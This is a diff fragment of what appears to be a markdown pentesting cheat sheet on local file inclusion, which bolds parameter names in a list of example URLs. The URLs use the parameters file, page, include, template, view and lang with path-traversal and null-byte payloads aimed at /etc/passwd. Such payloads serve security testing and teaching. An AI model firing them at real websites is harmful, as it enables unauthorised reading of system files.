@@ -18,12 +18,12 @@ You can move up directories with ../../../../ -> __example.com/index.php?page=./
 example.com/index.php?page=./../../../etc/password%00
 
 * F-P-I-T-V-L
-  * file - xample.com/index.php?file=../../../../etc/passwd
-  * page - example.com/index.php?page=../../../../etc/passwd
-  * include - example.com/index.php?include=../../../../etc/passwd
-  * template - example.com/index.php?template=../../../../etc/passwd
-  * view - example.com/index.php?view=../../../../etc/passwd
-  * lang - example.com/index.php?lang=../../../../etc/passwd
+  * **file** - xample.com/index.php?file=../../../../etc/passwd
+  * **page** - example.com/index.php?page=../../../../etc/passwd
+  * **include** - example.com/index.php?include=../../../../etc/passwd
+  * **template** - example.com/index.php?template=../../../../etc/passwd
+  * **view** - example.com/index.php?view=../../../../etc/passwd
+  * **lang** - example.com/index.php?lang=../../../../etc/passwd
 
 
 Side Note:
